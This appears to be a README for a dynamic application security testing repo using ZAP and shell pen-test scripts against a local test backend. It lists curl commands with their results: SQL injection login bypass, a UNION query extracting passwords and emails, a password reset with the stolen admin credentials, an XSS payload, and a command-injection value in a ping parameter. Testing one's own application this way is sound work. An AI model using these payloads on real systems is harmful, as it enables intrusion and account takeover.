# security-automated-tests

Automated Dynamic Application Security Tests (DAST)

##### Table of Contents  
[1. testing-stack](#testing-stack)<br />
[2. test-repo-dependencies](#repo-deps)<br />
[3. test-run-setup](#test-run)<br />
[4. security-test-observations](./docs/security_test_observations.md)<br />
[5. penetration-test-results-doc](./docs/pen_test_results.txt)<br />
[6. penetration-test-results-explanation](#test-results)<br />
[7. security-test-results-screenshots](#test-results-screenshots)<br />

<a name="testing-stack"></a>  

## 1. Testing stack

- **zap proxy** - zap proxy runner setup for dynamic application security test (DAST) automation      
- **python + javascript nashorn engine** - zap hooks and zap script extensions  
- **shell** - penetration test scripting 
- **docker** - docker for running dast tests

<a name="repo-deps"></a>

## 2. Test repo dependencies  
> **Note**   
> Need to run this step to install steps once for every new repo level dependencies added/updated   
```shell
source install.sh
```

> **Note**  
> docker and colima oci are optional replacement stack to avoid zap installation in local machine

<a name="test-run"></a>   

## 3. Test run setup  
> **Info** 
> Start Backend Server before running pen-tests
```bash
cd backend # from root folder 
pip install -r requirments.txt
source start-server.sh
``` 

> **Info**
> Script to run automated dynamic application security tests
> **Warning**  
> Script will create an auth token using admin credentials
> In actual test setup the username and password should read from envrionment variables
```shell
cd tests/security-tests # from root folder
source run_dast_tests.sh
```

> **Info**
> Script to run automated dynamic application security tests
```shell
source pen_tests.sh > pen_test_results.txt
```

<a name="test-results"></a> 

### Pen Test commands with results
```bash
------------------------------------------------
------------------------------------------------

Testing SQL Injection by passing default data validation to access the registration endpoint

curl -X POST http://localhost:5500/client_registeration -d 'fullName=newJohnDoe29761&userName=newjohndoe25015&email=newnoname20920@maildrop.cc" OR "1"="1&password=password&phone=1234567890'

{"msg":"Email already Exist"}
------------------------------------------------
------------------------------------------------

Testing SQL Injection by passing default data validation to access the login endpoint

curl -X POST http://localhost:5500/client_login -d 'userName=spammer&email=spam@email.com"OR 1=1;--&password=pwd'

{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6InNwYW1tZXIiLCJlbWFpbCI6InNwYW1AZW1haWwuY29tXCJPUiAxPTE7LS0iLCJyb2xlIjoxfQ.SfASxL9cTm8uSE0yTC7Wx3ilRmNLRQWOcAGdwXrk5Cs"}
------------------------------------------------
------------------------------------------------

Testing SQL Injection to retrieve account details

curl -X POST http://localhost:5500/client_login -d 'userName=spammer&email=spam@email.com" union select password || ":" || email from users;--&password=pwd'

{
  "userName": "spammer",
  "email": "spam@email.com\" union select password || \":\" || email from users;--",
  "role": "admin@1234:admin@test.com"
}
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6InNwYW1tZXIiLCJlbWFpbCI6InNwYW1AZW1haWwuY29tXCIgdW5pb24gc2VsZWN0IHBhc3N3b3JkIHx8IFwiOlwiIHx8IGVtYWlsIGZyb20gdXNlcnM7LS0iLCJyb2xlIjoiYWRtaW5AMTIzNDphZG1pbkB0ZXN0LmNvbSJ9.Ket7bPwysNf0cmO2YJmg_ZuIyRabd6Byu9ROUq9vnCA
------------------------------------------------
------------------------------------------------

Testing Resetting the password of the retrieved account

curl -X POST http://localhost:5500/update_info -d "token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6InNwYW1tZXIiLCJlbWFpbCI6InNwYW1AZW1haWwuY29tXCIgdW5pb24gc2VsZWN0IHBhc3N3b3JkIHx8IFwiOlwiIHx8IGVtYWlsIGZyb20gdXNlcnM7LS0iLCJyb2xlIjoiYWRtaW5AMTIzNDphZG1pbkB0ZXN0LmNvbSJ9.Ket7bPwysNf0cmO2YJmg_ZuIyRabd6Byu9ROUq9vnCA&currentPassword=admin@1234&newPassword=newpass"

{"msg":"Passowrd Reseted"}
------------------------------------------------
------------------------------------------------

Testing Input Validation

curl -X POST http://localhost:5500/client_registeration -d 'fullName=<script>alert(XSS)</script>&userName=testuser&email=test@example.com&password=test&phone=1234567890'

{"msg":"Email already Exist"}
------------------------------------------------
------------------------------------------------

Testing Insecure Use of Ping

curl -X GET http://localhost:5500/products -d 'source=google.com;ls'

{"msg":"Error"}
------------------------------------------------
------------------------------------------------
Testing Weak Error Message

curl -X POST http://localhost:5500/client_login -d 'email=nonexistent@example.com&password=wrongpassword'

<!doctype html>
<html lang=en>
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>The browser (or proxy) sent a request that this server could not understand.</p>

-------------------------------------
------------------------------------

```   



<a name="test-results-screenshots"></a> 

[1.security-tests-report-summary](./docs/dast_report_summary.png)<br /><br />
[2.security-tests-report-sql-injection](./docs/dast_report_sql_injection.png)<br /><br />
[3.security-tests-full-report](./docs/dast_full_report.png)<br /><br />